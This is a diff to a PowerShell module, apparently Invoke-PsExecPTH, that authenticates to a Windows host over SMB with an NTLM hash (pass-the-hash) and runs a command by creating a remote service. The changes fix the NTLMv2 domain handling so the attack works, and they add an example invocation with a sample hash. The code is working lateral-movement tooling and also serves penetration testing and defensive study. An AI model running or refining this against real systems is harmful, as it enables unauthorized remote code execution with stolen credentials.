@@ -12,7 +12,7 @@ Hostname or IP address of target.
 Username to use for PsExec authentication. The user must be a local administrator on the target.
 
 .PARAMETER Domain
-Domain to use for PsExec authentication.
+Domain ot hostname to use for PsExec authentication.
 
 .PARAMETER Hash
 NTLM password hash for PsExec authentication. This module will accept either LM:NTLM or NTLM format.
@@ -20,15 +20,18 @@ NTLM password hash for PsExec authentication. This module will accept either LM:
 .PARAMETER Command
 Command to execute on the target.
 
+.EXAMPLE
+Invoke-PsExecPTH -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command to execute"
+
 #>
 [CmdletBinding()]
 param
 (
-[parameter(Mandatory=$true)][String]$Target = "",
-[parameter(Mandatory=$true)][String]$Username = "",
-[parameter(Mandatory=$true)][String]$Domain = "",
-[parameter(Mandatory=$true)][String]$Command = "",
-[parameter(Mandatory=$true)][String]$Hash = ""
+[parameter(Mandatory=$true)][String]$Target,
+[parameter(Mandatory=$true)][String]$Username,
+[parameter(Mandatory=$true)][String]$Domain,
+[parameter(Mandatory=$true)][String]$Command,
+[parameter(Mandatory=$true)][String]$Hash
 )
 
 function Set-PacketSMBNegotiateProtocolRequest()
@@ -145,13 +148,6 @@ function Set-PacketSMBSessionSetupAndXRequestNTLMSSPAuth()
     [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 86)
     $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]
     
-     #[Byte[]]$packet_length_1 = 0x01,0xcc
-
-      #  [Byte[]]$packet_length_2 = 0x01,0xc8
-
-       # [Byte[]]$packet_length_3 = 0x01,0xc4
-
-
     [Byte[]]$packet_SMB_session_setup_andx_request_NTLMSSP_auth = [Array]0x00 +
                                                                     $packet_netbios_session_service_length +
                                                                     0xff,0x53,0x4d,0x42,
@@ -659,9 +655,7 @@ $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
 $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
 $SMB_domain_offset = DataLength2 ($SMB_NTLMSSP_bytes_index + 16) $SMB_client_receive
 $SMB_domain = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + $SMB_domain_offset)..($SMB_NTLMSSP_bytes_index + $SMB_domain_offset + $SMB_domain_length - 1)]
-$SMB_domain_length_offset_bytes = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 12)..($SMB_NTLMSSP_bytes_index + 19)]
 $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
-$SMB_target_length_offset_bytes = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 40)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
 $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
 $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
 $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.length - 12)..($SMB_target_details.length - 5)]
@@ -670,9 +664,9 @@ $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Co
 $auth_hostname = (get-childitem -path env:computername).Value
 $auth_hostname = (&{for ($i = 0;$i -lt $auth_hostname.length;$i += 1){$auth_hostname.SubString($i,1)}}) -join "`0"
 $auth_hostname = $auth_hostname + "`0"
-$auth_domain = (&{for ($i = 0;$i -lt $domain.length;$i += 1){$domain.SubString($i,1)}}) -join "`0"
+$auth_domain = $Domain.ToUpper() 
+$auth_domain = (&{for ($i = 0;$i -lt $auth_domain.length;$i += 1){$auth_domain.SubString($i,1)}}) -join "`0"
 $auth_domain = $auth_domain + "`0"
-$auth_domain = $auth_domain.ToUpper() 
 $auth_username = (&{for ($i = 0;$i -lt $username.length;$i += 1){$username.SubString($i,1)}}) -join "`0"
 $auth_username = $auth_username + "`0"
 $auth_domain_bytes = [Text.Encoding]::UTF8.GetBytes($auth_domain)
@@ -698,7 +692,7 @@ $username_and_target = $username
 $username_and_target = (&{for ($i = 0;$i -lt $username_and_target.length;$i += 1){$username_and_target.SubString($i,1)}}) -join "`0"
 $username_and_target = $username_and_target + "`0"
 $username_and_target_bytes = [Text.Encoding]::UTF8.GetBytes($username_and_target)
-$username_and_target_bytes += $SMB_domain
+$username_and_target_bytes += $auth_domain_bytes
 $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
 $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
 $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
@@ -781,7 +775,6 @@ if($login_successful)
     $SMB_path_bytes = 0x5c,0x5c + [System.Text.Encoding]::UTF8.GetBytes($Target) + 0x5c,0x49,0x50,0x43,0x24,0x00
     $SMB_path_byte_count = [System.BitConverter]::GetBytes($SMB_path_bytes.Length + 7)
     $SMB_path_byte_count = $SMB_path_byte_count[0,1]
-    #$SMB_relay_execute_bytes = New-Object System.Byte[] 1024
     $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
     $SMB_service = $SMB_service_random -replace "-00",""
     $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
@@ -887,7 +880,6 @@ if($login_successful)
         {
             $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
             $SMB_context_handle = $SMB_client_receive[88..107]
-            #$Domain = $Domain.ToUpper()
 
             if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_context_handle) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
             {
